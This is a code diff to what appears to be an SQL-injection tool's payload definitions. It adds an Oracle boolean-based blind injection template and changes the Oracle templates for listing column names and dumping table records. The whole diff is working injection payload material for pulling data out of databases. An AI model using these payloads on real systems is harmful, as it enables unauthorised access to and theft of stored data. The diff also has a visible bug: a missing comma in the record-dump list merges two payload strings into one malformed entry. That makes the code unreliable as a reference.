@@ -1602,6 +1602,15 @@ PAYLOADS = {
     "Oracle": {
         "boolean-based": [
             {
+                "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 01234 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "Oracle boolean-based blind - Parameter replace",
+                "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN 01234 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",
+                "dbms": "",
+            },
+            {
                 "payload": "AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,0568) END) FROM DUAL) IS NULL",
                 "comments": [
                     {"pref": " ", "suf": "--"},
@@ -2004,7 +2013,7 @@ PAYLOADS_COLS_NAMES = {
         "(SELECT TOP 1 name FROM {db}..syscolumns WHERE 1=1)",
     ],
     "Oracle": [
-        "(SELECT COLUMN_NAME FROM SYS.ALL_TAB_COLUMNS WHERE OWNER={db} AND TABLE_NAME={tbl})"
+        "(SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME,ROWNUM AS LIMIT FROM SYS.ALL_TAB_COLUMNS WHERE OWNER={db} AND TABLE_NAME={tbl}) WHERE LIMIT=1)",
     ],
 }
 
@@ -2053,7 +2062,9 @@ PAYLOADS_RECS_DUMP = {
         "(SELECT TOP 1 {col} FROM {tbl} WHERE 1=1)",
     ],
     "Oracle": [
-        "(SELECT {col} FROM (SELECT qq.*,ROWNUM AS LIMIT FROM {tbl} qq ORDER BY ROWNUM) WHERE LIMIT=1)"
+        "(SELECT {col} FROM (SELECT {col},ROWNUM AS LIMIT FROM {tbl} {col} ORDER BY ROWNUM) WHERE LIMIT=1)"
+        "(SELECT {col} FROM (SELECT {col},ROWNUM AS LIMIT FROM {tbl}) WHERE LIMIT=1)",
+        "(SELECT {col} FROM (SELECT qq.*,ROWNUM AS LIMIT FROM {tbl} qq ORDER BY ROWNUM) WHERE LIMIT=1)",
     ],
 }
 
